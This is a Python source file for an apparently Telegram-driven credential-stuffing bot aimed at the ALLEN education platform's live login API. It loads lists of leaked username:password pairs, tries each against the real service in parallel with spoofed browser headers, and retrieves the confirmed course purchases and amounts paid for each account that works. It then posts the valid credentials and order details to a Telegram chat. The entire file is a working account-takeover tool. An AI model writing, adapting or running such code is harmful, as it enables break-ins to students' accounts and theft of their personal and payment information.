import requests
import os
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from functools import partial

# --- CONFIG ---
MAX_THREADS = 15
print_lock = threading.Lock()
progress_lock = threading.Lock()

LOGIN_URL = "https://api.allen-live.in/api/v1/auth/username"
ORDERS_URL = "https://api.allen-live.in/ecomm-bff/api/v1/orders"
HEADERS = {
    "accept": "application/json", "content-type": "application/json",
    "x-client-type": "web", "x-device-id": "5a76f3a0-e6e7-4f33-972f-1b4a9593d154",
    "origin": "https://allen.in", "referer": "https://allen.in/", 
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

# --- HELPERS ---
def is_valid_user(u):
    if '@' in u and '.' in u.split('@')[-1]:
        return True
    if u.isdigit() and 6 <= len(u) <= 12:
        return True
    return False

def parse_combo(line):
    line = line.strip()
    if not line or line.startswith(('IN ', 'OF ', '#')):
        return None
    parts = [p.strip() for p in line.split(':') if p.strip()]
    if len(parts) < 2:
        return None
    password = parts[-1]
    username = None
    for i in range(len(parts)-2, -1, -1):
        candidate = parts[i]
        if is_valid_user(candidate):
            username = candidate
            break
    if not username:
        return None
    itype = "EMAIL" if '@' in username else "FORM_ID"
    return username, password, itype

def login(user, pas, itype):
    try:
        r = requests.post(LOGIN_URL, json={
            "username": user, "password": pas,
            "persona_type": "STUDENT", "identity_type": itype
        }, headers=HEADERS, timeout=8)
        if r.status_code == 200 and r.json().get("status") == 200:
            tok = r.headers.get("X-ACCESS-TOKEN")
            if tok:
                return tok
    except:
        pass
    return None

def get_batches(tok):
    try:
        h = HEADERS.copy()
        h["authorization"] = f"Bearer {tok}"
        r = requests.get(ORDERS_URL, headers=h, timeout=8)
        orders = r.json().get("data", {}).get("orders", [])
        return [o for o in orders if o.get("status", {}).get("type") == "CONFIRMED"]
    except:
        return []

def get_amount(batch):
    pp = batch.get("payment_plan", {})
    inst = pp.get("instalments", [])
    
    paid = 0
    for item in inst:
        if item.get("status") == "PAID":
            amt = item.get("total_amount") or item.get("paid_amount") or item.get("amount")
            if amt and isinstance(amt, (int, float)):
                paid += amt
    
    if paid > 0:
        return f"₹{int(paid)}"
    
    if inst and isinstance(inst[0], dict):
        amt = inst[0].get("total_amount") or inst[0].get("paid_amount")
        if amt and isinstance(amt, (int, float)):
            return f"₹{int(amt)}"
    
    amt = pp.get("total_amount") or pp.get("paid_amount")
    if amt and isinstance(amt, (int, float)):
        return f"₹{int(amt)}"
    
    return "N/A"

# --- BOT LOGIC ---
def check_account(line, bot, chat_id, hits_list, state, total_lines):
    parsed = parse_combo(line)
    if not parsed:
        with print_lock:
            state['checked'] += 1
        return

    user, pas, itype = parsed
    
    try:
        # Try detected type first, then fallback
        tok = login(user, pas, itype)
        if not tok:
            fallback = "FORM_ID" if itype == "EMAIL" else "EMAIL"
            tok = login(user, pas, fallback)
            if tok:
                itype = fallback
        
        if not tok:
            with print_lock:
                state['checked'] += 1
            return
        
        batches = get_batches(tok)
        
        with print_lock:
            if batches:
                state['hits'] += 1
                state['checked'] += 1
                
                # DETAILED FORMAT
                indicator = "📧" if itype == "EMAIL" else "🔢"
                hit_text = f"🎓 *APP NAME : ALLEN*\n\n"
                hit_text += f"{indicator} *Login :* `{user}` ({'Email' if itype=='EMAIL' else 'Form ID'})\n"
                hit_text += f"🔑 *Pass :* `{pas}`\n"
                hit_text += f"📦 *Batches :* {len(batches)}\n\n"
                
                for i, b in enumerate(batches, 1):
                    title = b.get("title", "N/A")
                    bid = b.get("id", "N/A")
                    attrs = " | ".join([a for a in b.get("attributes", []) if a]) or "N/A"
                    amount = get_amount(b)
                    date = b.get("created_date", "N/A")
                    status = b.get("status", {}).get("label", "N/A")
                    
                    hit_text += f"*{i}. {title}*\n"
                    hit_text += f"   🪪 *ID :* `{bid}`\n"
                    hit_text += f"   💰 *Amount :* {amount}\n"
                    hit_text += f"   📋 *Attrs :* {attrs}\n"
                    hit_text += f"   📅 *Date :* {date}\n"
                    hit_text += f"   ✅ *Status :* {status}\n\n"
                
                hits_list.append(hit_text)
                
                # Update progress (5 second rule)
                update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines, state)
            else:
                state['checked'] += 1

    except Exception as e:
        with print_lock:
            state['checked'] += 1

def update_progress(bot, chat_id, msg_id, hits, checked, total, state):
    """Update progress only every 5 seconds"""
    current_time = time.time()
    
    # Check if 5 seconds have passed since last update
    if current_time - state.get('last_update', 0) >= 5:
        with progress_lock:
            # Double check inside lock
            if current_time - state.get('last_update', 0) >= 5:
                try:
                    if total > 0:
                        progress_percent = int((checked / total) * 10)
                        bar = "■" * progress_percent + "▢" * (10 - progress_percent)
                    else:
                        bar = "■■▢▢▢▢▢"
                    
                    progress_text = f"""╭───☀ 𝖢𝖧𝖤𝖢𝖪𝖨𝖭𝖦 ☀───╮
┣ ⚙️ {bar} 
┣ 📊 Hit : {hits}
┣ 📂 Loaded : {checked}/{total}
┣ 🔥 Status : Checking...
╰─── 𝐀𝐥𝐥𝐞𝐧 𝐁𝐨𝐭 ───╯"""
                    
                    bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=progress_text)
                    state['last_update'] = current_time
                except:
                    pass

def run_check(bot, chat_id, progress_msg_id, combo_file, platform_name):
    hits_list = []
    
    with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
        lines = [l.strip() for l in f.readlines() if l.strip()]

    total_lines = len(lines)
    state = {'hits': 0, 'checked': 0, 'msg_id': progress_msg_id, 'last_update': 0}
    
    func = partial(check_account, bot=bot, chat_id=chat_id, hits_list=hits_list, state=state, total_lines=total_lines)
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        executor.map(func, lines)

    # Final File
    final_filename = "allen_hit.txt"
    if hits_list and state['hits'] > 0:
        with open(final_filename, "w", encoding="utf-8") as f:
            for hit in hits_list:
                f.write(hit)

        time.sleep(2)
        try:
            with open(final_filename, "rb") as f:
                bot.send_document(chat_id, f, caption=f"✅ {platform_name} Valid Hits ({state['hits']})")
        except:
            pass
        
        if os.path.exists(final_filename):
            os.remove(final_filename)
    else:
        try:
            bot.send_message(chat_id, "❌ No valid hits found.")
        except:
            pass

    try:
        bot.delete_message(chat_id, progress_msg_id)
    except:
        pass
        
    if os.path.exists(combo_file):
        os.remove(combo_file)